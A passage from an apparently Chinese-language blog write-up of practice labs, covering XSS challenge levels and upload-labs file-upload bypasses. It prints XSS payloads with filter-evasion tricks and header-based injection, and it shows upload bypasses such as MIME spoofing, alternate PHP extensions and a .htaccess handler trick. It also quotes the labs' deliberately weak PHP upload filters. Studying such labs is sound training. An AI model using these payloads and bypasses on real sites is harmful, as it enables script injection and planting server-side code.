<div class="hljs"><pre><code class="hljs \">&#39;onclick&#x3D;&#39;javascript:alert(1)&#39;</code></pre></div>

<p>再点击一次就可以过关</p>
<h2 id="4"><a href="#4" class="headerlink" title="4"></a>4</h2><p>这题与上面的一样只不过这次换成了双引号闭合</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210303153135610.png" srcset="/img/loading.gif" alt="image-20210303153135610"></p>
<div class="hljs"><pre><code class="hljs 1c"><span class="hljs-string">&quot;onclick=&#x27;javascript:alert(1)&#x27;</span></code></pre></div>

<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210303153118763.png" srcset="/img/loading.gif" alt="image-20210303153118763" style="zoom:50%;">

<h2 id="5"><a href="#5" class="headerlink" title="5"></a>5</h2><p>提交<code>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210303153451829.png" srcset="/img/loading.gif" alt="image-20210303153451829"></p>
<p>可以发现script被换成了scr_ipt，使用<code>&quot;onclick=&#39;javascript:alert(1)&#39;</code>也不行</p>
<p>再换一种方法</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210303153621744.png" srcset="/img/loading.gif" alt="image-20210303153621744"></p>
<h2 id="6"><a href="#6" class="headerlink" title="6"></a>6</h2><p>尝试了</p>
<div class="hljs"><pre><code class="hljs routeros">&lt;input <span class="hljs-attribute">name</span>=keyword  <span class="hljs-attribute">value</span>=<span class="hljs-string">&quot; &quot;</span>&gt;&lt;a <span class="hljs-attribute">hr_ef</span>=<span class="hljs-string">&quot;javascript:alert(1)&quot;</span>&gt;&quot;&gt;
&lt;input <span class="hljs-attribute">name</span>=keyword  <span class="hljs-attribute">value</span>=<span class="hljs-string">&quot; &quot;</span>o_nclick=&#x27;javascript:alert(1)&#x27; <span class="hljs-string">&quot;&gt;</span>
<span class="hljs-string">&lt;input name=keyword  value=&quot;</span> <span class="hljs-string">&quot;&lt;scr_ipt&gt; alert(1)&lt;/script&gt;&quot;</span>&gt;</code></pre></div>

<p>但是都不行了，尝试了看样子是过了href, onclick, script关键词，尝试大小写绕过</p>
<p>提交</p>
<div class="hljs"><pre><code class="hljs 1c"><span class="hljs-string">&quot;oNclick=&#x27;javascript:alert(1)&#x27;</span></code></pre></div>

<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210303160021818.png" srcset="/img/loading.gif" alt="image-20210303160021818"></p>
<h2 id="7"><a href="#7" class="headerlink" title="7"></a>7</h2><p>提交<code>&quot;oNclick=&#39;javascript:alert(1)&#39;</code>,但是发现on被过滤了</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210303160102536.png" srcset="/img/loading.gif" alt="image-20210303160102536"></p>
<p>直接尝试双写绕过</p>
<div class="hljs"><pre><code class="hljs ada">oonnclick=<span class="hljs-symbol">&#x27;javascript</span>:alert(<span class="hljs-number">1</span>)</code></pre></div>



<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210303160204046.png" srcset="/img/loading.gif" alt="image-20210303160204046"></p>
<h2 id="8"><a href="#8" class="headerlink" title="8"></a>8</h2><p>提交<code>&quot;oNclick=&#39;javascript:alert(1)</code>，可以发现过滤了 <code>&quot; &lt; &gt;</code>，而且进行了实体转换</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210303160514318.png" srcset="/img/loading.gif" alt="image-20210303160514318"></p>
<p>换一种新的注入方法html字符转换绕过</p>
<div class="hljs"><pre><code class="hljs apache"><span class="hljs-attribute">java</span>&amp;#<span class="hljs-number">115</span>;&amp;#<span class="hljs-number">99</span>;&amp;#<span class="hljs-number">114</span>;&amp;#<span class="hljs-number">105</span>;&amp;#<span class="hljs-number">112</span>;&amp;#<span class="hljs-number">116</span>;:alert(<span class="hljs-number">1</span>)</code></pre></div>

<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210303160720539.png" srcset="/img/loading.gif" alt="image-20210303160720539"></p>
<h2 id="9"><a href="#9" class="headerlink" title="9"></a>9</h2><p>尝试第八关使用的代码但是发现不行</p>
<p>但是查看源码可以发现提示你的链接不合法，那么合法的链接有什么特点呢</p>
<p>就是带有协议头</p>
<div class="hljs"><pre><code class="hljs javascript">java&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:alert(<span class="hljs-number">1</span>) <span class="hljs-comment">// http://</span></code></pre></div>

<h2 id="10"><a href="#10" class="headerlink" title="10"></a>10</h2><p>尝试了几种方法之后发现 ,没有输出点</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210303162415275.png" srcset="/img/loading.gif" alt="image-20210303162415275"></p>
<p>可以发现输入点是隐藏的</p>
<p>使用下面代码测试以上三个哪个是可以注入的</p>
<div class="hljs"><pre><code class="hljs dts"><span class="hljs-variable">&amp;t_link</span>=<span class="hljs-string">&quot; text&quot;</span> <span class="hljs-variable">&amp;t_history</span>=<span class="hljs-string">&quot;text&quot;</span><span class="hljs-variable">&amp;t_sort</span>=<span class="hljs-string">&quot;text&quot;</span></code></pre></div>



<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210303162558986.png" srcset="/img/loading.gif" alt="image-20210303162558986"></p>
<p>再构造代码</p>
<div class="hljs"><pre><code class="hljs isbl">&amp;<span class="hljs-variable">t_sort</span>=<span class="hljs-string">&quot; type=&quot;</span><span class="hljs-variable">text</span><span class="hljs-string">&quot; onclick=&quot;</span><span class="hljs-function"><span class="hljs-title">alert</span>(<span class="hljs-number">1</span>)</span></code></pre></div>

<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210303162721705.png" srcset="/img/loading.gif" alt="image-20210303162721705"></p>
<h2 id="11"><a href="#11" class="headerlink" title="11"></a>11</h2><p>进入页面后尝试使用上一关的方法但是无效，上网查看后发现是再refere头注入</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210303164336051.png" srcset="/img/loading.gif" alt="image-20210303164336051" style="zoom:50%;">

<p>可以发现相应包中已经被注入了XSS</p>
<p>在抓包页面返回给浏览器，就会出现被注入的输入框</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210303164657154.png" srcset="/img/loading.gif" alt="image-20210303164657154" style="zoom:50%;">

<h2 id="12"><a href="#12" class="headerlink" title="12"></a>12</h2><p>继续抓包，这次可以发现是在UA中注入</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210303164836733.png" srcset="/img/loading.gif" alt="image-20210303164836733" style="zoom:67%;">

<p>与上一关做法相似</p>
<p>出现输入框点击即可</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210303164930662.png" srcset="/img/loading.gif" alt="image-20210303164930662" style="zoom:50%;">

<h2 id="13"><a href="#13" class="headerlink" title="13"></a>13</h2><p>这关是在cookie处注入，方法与之前相同</p>
<p>payload</p>
<div class="hljs"><pre><code class="hljs isbl"><span class="hljs-variable">cookie</span>: 原值+<span class="hljs-variable">user</span>=<span class="hljs-string">&quot; type=text onclick=&quot;</span><span class="hljs-function"><span class="hljs-title">alert</span>(<span class="hljs-number">1</span>)</span></code></pre></div>

<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210303165143032.png" srcset="/img/loading.gif" alt="image-20210303165143032" style="zoom:67%;">

<h2 id="14"><a href="#14" class="headerlink" title="14"></a>14</h2><p>需要使用带XSS的图片</p>
<h2 id="15"><a href="#15" class="headerlink" title="15"></a>15</h2><p>直接查看源码</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210303171027487.png" srcset="/img/loading.gif" alt="image-20210303171027487" style="zoom:50%;">



<p>这里用了angularjs的ng-include，直接在包含的页面里用<code>&lt;script&gt;</code>触发不了，用了img标签</p>
<p>AngularJS ng-include 指令</p>
<p>ng-include 指令用于包含外部的 HTML 文件。</p>
<p>包含的内容将作为指定元素的子节点。</p>
<p>ng-include 属性的值可以是一个表达式，返回一个文件名。</p>
<p>默认情况下，包含的文件需要包含在同一个域名下。</p>
<div class="hljs"><pre><code class="hljs livecodeserver">&lt;<span class="hljs-keyword">element</span> ng-<span class="hljs-built_in">include</span>=<span class="hljs-string">&quot;filename&quot;</span> onload=<span class="hljs-string">&quot;expression&quot;</span> autoscroll=<span class="hljs-string">&quot;expression&quot;</span> &gt;&lt;/<span class="hljs-keyword">element</span>&gt;</code></pre></div>

<p>遵循SOP，只好调用第一关代码。</p>
<p>需要单引号包裹，否则变成注释。</p>
<p>paload：</p>
<div class="hljs"><pre><code class="hljs xml">/level15.php?src=&#x27;level1.php?name=test<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">1</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(1)</span>&gt;</span>&#x27;</code></pre></div>

<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210303171428095.png" srcset="/img/loading.gif" alt="image-20210303171428095" style="zoom:50%;">

<h2 id="16"><a href="#16" class="headerlink" title="16"></a>16</h2><p>测试发现过滤空格，script，/，所以使用%0d %0a做分割符绕过过滤</p>
<p>payload</p>
<div class="hljs"><pre><code class="hljs llvm">&lt;img<span class="hljs-variable">%0</span>Asrc<span class="hljs-operator">=</span><span class="hljs-keyword">x</span><span class="hljs-variable">%0</span>Aonerror<span class="hljs-operator">=</span>alert(a)&gt;

&lt;iframe<span class="hljs-variable">%0</span>asrc<span class="hljs-operator">=</span><span class="hljs-keyword">x</span><span class="hljs-variable">%0</span>donmouseover<span class="hljs-operator">=</span>alert`<span class="hljs-number">1</span>`&gt;&lt;/iframe&gt;</code></pre></div>

<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210303171803825.png" srcset="/img/loading.gif" alt="image-20210303171803825" style="zoom:50%;">



<h2 id="17"><a href="#17" class="headerlink" title="17"></a>17</h2><p>查看源码找到注入位置</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210303172359498.png" srcset="/img/loading.gif" alt="image-20210303172359498" style="zoom:50%;">



<p>但是这里过滤<code>&lt;, &gt;</code>，使用事件触发弹窗</p>
<p>Payload：</p>
<div class="hljs"><pre><code class="hljs routeros">?<span class="hljs-attribute">arg01</span>=&amp;arg02= <span class="hljs-attribute">onmouseover</span>=alert(1)</code></pre></div>

<h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><p>环境使用phpstudy很容易搭建</p>
<h2 id="pass1"><a href="#pass1" class="headerlink" title="pass1"></a>pass1</h2><p>直接抓包修改文件后缀名为jpg,png,gif即可</p>
<h2 id="pass2"><a href="#pass2" class="headerlink" title="pass2"></a>pass2</h2><p>查看源码</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-keyword">if</span> ((<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>] == <span class="hljs-string">&#x27;image/jpeg&#x27;</span>) || (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>] == <span class="hljs-string">&#x27;image/png&#x27;</span>) || (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>] == <span class="hljs-string">&#x27;image/gif&#x27;</span>))</code></pre></div>

<p>这段代码说明是对文件的<code>MIME</code>类型进行了过滤，直接上传 1.php 抓包后修改文件类型为 <code>&#39;image/jpeg&#39; ,&#39;image/png&#39;,&#39;image/gif&#39;</code>,这三个类型都为图片</p>
<p>抓包修改MIME即可</p>
<p>知识点补充：</p>
<p> <strong>MIME类型对大小写不敏感，但是传统写法都是小写。</strong> </p>
<div class="hljs"><pre><code class="hljs applescript"><span class="hljs-built_in">text</span>/plain
<span class="hljs-built_in">text</span>/html
image/jpeg
image/png
audio/mpeg
audio/ogg
audio/*
video/mp4
<span class="hljs-built_in">application</span>/*
<span class="hljs-built_in">application</span>/json
<span class="hljs-built_in">application</span>/javascript
<span class="hljs-built_in">application</span>/ecmascript
<span class="hljs-built_in">application</span>/octet-stream</code></pre></div>

<p>更详细的解释，</p>
<h2 id="pass3"><a href="#pass3" class="headerlink" title="pass3"></a>pass3</h2><div class="hljs"><pre><code class="hljs php"><span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;.asp&#x27;</span>,<span class="hljs-string">&#x27;.aspx&#x27;</span>,<span class="hljs-string">&#x27;.php&#x27;</span>,<span class="hljs-string">&#x27;.jsp&#x27;</span>);</code></pre></div>

<p>只禁止了.asp,.aspx,.php,.jsp后缀文件，可以使用php3,php5,php7,phtml等等后缀名绕过</p>
<h2 id="pass4"><a href="#pass4" class="headerlink" title="pass4"></a>pass4</h2><p><strong>.htaccess</strong>文件的作用</p>
<blockquote>
<ul>
<li>URL重写、自定义错误页面</li>
<li>MIME类型配置</li>
<li>访问权限控制等</li>
<li>主要体现在伪静态的应用</li>
<li>图片防盗链</li>
<li>自定义404错误页面</li>
<li>阻止/允许特定IP/IP段</li>
<li>目录浏览与主页</li>
<li>禁止访问指定文件类型</li>
<li>文件密码保护</li>
</ul>
</blockquote>
<div class="hljs"><pre><code class="hljs apache"><span class="hljs-section">&lt;FilesMatch <span class="hljs-string">&quot;1.jpg&quot;</span>&gt;</span>
<span class="hljs-attribute"><span class="hljs-nomarkup">SetHandler</span></span> application/x-httpd-php
<span class="hljs-section">&lt;/FilesMatch&gt;</span></code></pre></div>

<p>这几句代码的意思：</p>
<p>通过.htaccess文件调用php解析器去解析一个文件名中只要包含”1.jpg”这个字符串的任意文件，</p>
<p>无论扩展名是什么(没有也行)，都以php的方式来解析</p>
<p>上传完.htaccess文件后直接上传一个 <code>1.jpg</code>即可</p>
<h2 id="pass5"><a href="#pass5" class="headerlink" title="pass5"></a>pass5</h2><div class="hljs"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;
<span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;
    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;
        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>);
        <span class="hljs-variable">$file_name</span> = trim(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);
        <span class="hljs-variable">$file_name</span> = deldot(<span class="hljs-variable">$file_name</span>);<span class="hljs-comment">//删除文件名末尾的点</span>
        <span class="hljs-variable">$file_ext</span> = strrchr(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);
        <span class="hljs-variable">$file_ext</span> = strtolower(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//转换为小写</span>
        <span class="hljs-variable">$file_ext</span> = str_ireplace(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//去除字符串::$DATA</span>
        <span class="hljs-variable">$file_ext</span> = trim(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//首尾去空</span>
        
        <span class="hljs-keyword">if</span> (!in_array(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;
            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];
            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$file_name</span>;
            <span class="hljs-keyword">if</span> (move_uploaded_file(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;
                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;
            &#125; <span class="hljs-keyword">else</span> &#123;
                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;
            &#125;
        &#125; <span class="hljs-keyword">else</span> &#123;
            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;此文件类型不允许上传！&#x27;</span>;
        &#125;
    &#125; <span class="hljs-keyword">else</span> &#123;
        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;
    &#125;
&#125;</code></pre></div>

<p>本题与第十题完全一样，详细解答见第十题</p>
<img src="/2021/03/03/net-a-and-d/E:%5Cmyblog%5Cszyblog%5Csource%5C_posts%5Cuploads%5C5.png" srcset="/img/loading.gif" style="zoom:50%;">



<h2 id="pass6"><a href="#pass6" class="headerlink" title="pass6"></a>pass6</h2><div class="hljs"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;
<span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;
    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;
        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>,<span class="hljs-string">&quot;.ini&quot;</span>);
        <span class="hljs-variable">$file_name</span> = trim(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);
        <span class="hljs-variable">$file_name</span> = deldot(<span class="hljs-variable">$file_name</span>);<span class="hljs-comment">//删除文件名末尾的点</span>
        <span class="hljs-variable">$file_ext</span> = strrchr(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);
        <span class="hljs-variable">$file_ext</span> = str_ireplace(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//去除字符串::$DATA</span>
        <span class="hljs-variable">$file_ext</span> = trim(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//首尾去空</span>

        <span class="hljs-keyword">if</span> (!in_array(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;
            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];
            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.date(<span class="hljs-string">&quot;YmdHis&quot;</span>).rand(<span class="hljs-number">1000</span>,<span class="hljs-number">9999</span>).<span class="hljs-variable">$file_ext</span>;
            <span class="hljs-keyword">if</span> (move_uploaded_file(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;
                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;
            &#125; <span class="hljs-keyword">else</span> &#123;
                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;
            &#125;
        &#125; <span class="hljs-keyword">else</span> &#123;
            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;此文件类型不允许上传！&#x27;</span>;
        &#125;
    &#125; <span class="hljs-keyword">else</span> &#123;
        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;
    &#125;
&#125;</code></pre></div>

<p>仔细查看源码会发现少了下面的这段代码</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-variable">$file_ext</span> = strtolower(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//转换为小写</span></code></pre></div>

<p>这里就可以大小写绕过。将文件后缀名改为<code>.pHp , .PHP</code>等</p>
<h2 id="pass7"><a href="#pass7" class="headerlink" title="pass7"></a>pass7</h2><div class="hljs"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;
<span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;
    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;
        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>,<span class="hljs-string">&quot;.ini&quot;</span>);
        <span class="hljs-variable">$file_name</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];
        <span class="hljs-variable">$file_name</span> = deldot(<span class="hljs-variable">$file_name</span>);<span class="hljs-comment">//删除文件名末尾的点</span>
        <span class="hljs-variable">$file_ext</span> = strrchr(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);
        <span class="hljs-variable">$file_ext</span> = strtolower(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//转换为小写</span>
        <span class="hljs-variable">$file_ext</span> = str_ireplace(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//去除字符串::$DATA</span>
        
